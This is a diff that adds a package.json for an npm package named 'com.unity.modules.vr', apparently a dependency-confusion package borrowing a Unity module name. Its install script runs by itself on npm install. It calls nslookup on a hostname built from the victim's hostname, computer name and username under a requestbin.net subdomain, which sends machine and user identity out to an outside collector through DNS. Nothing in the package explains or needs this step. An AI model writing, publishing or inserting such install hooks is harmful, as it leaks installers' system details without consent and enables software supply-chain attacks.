@@ -1,0 +1,11 @@
+{
+  "name": "com.unity.modules.vr",
+  "version": "200.0.6",
+  "description": "com.unity.modules.vr: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.com.unity.modules.vr.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
